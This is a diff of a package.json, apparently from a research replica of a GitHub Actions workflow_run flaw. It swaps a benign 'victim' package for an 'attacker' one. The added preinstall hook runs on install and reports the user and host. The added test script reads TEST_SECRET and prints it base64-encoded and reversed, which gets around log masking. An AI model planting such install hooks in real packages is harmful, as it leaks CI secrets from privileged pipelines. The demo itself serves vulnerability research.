@@ -1,10 +1,8 @@
 {
-  "name": "ossvrp-f1-victim",
+  "name": "attacker",
   "version": "1.0.0",
-  "private": true,
-  "description": "Benign baseline app for the OSS-VRP F1 workflow_run replica. The vulnerable chained.yml checks out the PR-head repo, not this one, so this file is only here so the repo looks like a real npm project.",
   "scripts": {
-    "build": "echo benign build",
-    "test": "echo benign tests"
+    "preinstall": "node -e \"const os=require('os');console.log('=== PWN: preinstall ran in PRIVILEGED workflow_run context as '+os.userInfo().username+' on '+os.hostname()+' ===')\"",
+    "test": "node -e \"const s=process.env.TEST_SECRET||'(empty)';const b=Buffer.from(s).toString('base64');console.log('=== PWN: secret reached attacker code ===');console.log('TEST_SECRET length: '+s.length);console.log('EXFIL_B64: '+b);console.log('EXFIL_REV: '+s.split('').reverse().join(''));\""
   }
 }
